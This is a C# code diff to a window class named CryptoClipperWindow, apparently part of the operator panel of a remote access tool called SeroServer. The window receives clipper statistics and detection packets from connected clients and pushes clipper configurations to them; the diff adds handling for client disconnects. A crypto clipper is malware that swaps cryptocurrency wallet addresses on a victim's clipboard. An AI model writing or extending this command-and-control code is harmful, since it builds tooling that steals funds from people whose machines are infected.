@@ -11,6 +11,7 @@ public partial class CryptoClipperWindow : ThemedWindow
     private readonly TlsServer _server;
     private readonly string    _clientId;
     private int                _totalCount;
+    private bool               _disconnected;
 
     public CryptoClipperWindow(TlsServer server, string clientId, string clientLabel)
     {
@@ -21,6 +22,7 @@ public partial class CryptoClipperWindow : ThemedWindow
 
         _server.RegisterHandler(clientId, PacketType.ClipperStatsResult, OnStatsResult);
         _server.RegisterHandler(clientId, PacketType.ClipperDetected,    OnDetected);
+        _server.ClientDisconnected += OnClientDisconnected;
 
         Lang.LanguageChanged += ApplyLanguage;
         ApplyLanguage();
@@ -28,6 +30,7 @@ public partial class CryptoClipperWindow : ThemedWindow
         {
             _server.UnregisterHandler(clientId, PacketType.ClipperStatsResult);
             _server.UnregisterHandler(clientId, PacketType.ClipperDetected);
+            _server.ClientDisconnected -= OnClientDisconnected;
             Lang.LanguageChanged -= ApplyLanguage;
         };
 
@@ -91,6 +94,7 @@ public partial class CryptoClipperWindow : ThemedWindow
 
     private async void BtnApply_Click(object s, RoutedEventArgs e)
     {
+        if (_disconnected) return;
         try
         {
             var cfg = new ClipperSetConfigData
@@ -145,6 +149,16 @@ public partial class CryptoClipperWindow : ThemedWindow
         TxtLog.Clear();
         _totalCount = 0;
         TxtCount.Text = $"0 {Lang.Get("RECORDS_COUNT")}";
+    }
+
+    private void OnClientDisconnected(SeroServer.Data.ConnectedClient c)
+    {
+        if (c.Id != _clientId) return;
+        Dispatcher.BeginInvoke(() =>
+        {
+            _disconnected = true;
+            TxtStatus.Text = Lang.Get("PM_DISCONNECTED");
+        });
     }
 
     private void Close_Click(object s, RoutedEventArgs e) => Close();
